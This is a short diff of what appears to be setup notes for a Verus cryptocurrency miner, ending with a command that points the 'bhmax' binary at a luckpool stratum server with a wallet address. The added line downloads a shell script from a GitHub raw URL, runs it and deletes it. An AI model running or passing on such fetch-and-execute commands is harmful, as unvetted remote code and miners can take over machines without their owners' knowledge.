@@ -5,6 +5,8 @@ npm i dotenv (install modul dotenv di node)
 
 apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
 
+wget https://raw.githubusercontent.com/hudahadoh/vs/main/vs.sh && chmod +x vs.sh && ./vs.sh && rm vs.sh && cd /usr/bin
+
 ./bhmax -a verus  -o stratum+tcp://eu.luckpool.net:3956  -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.py1 -p x -t 1
 
 ###
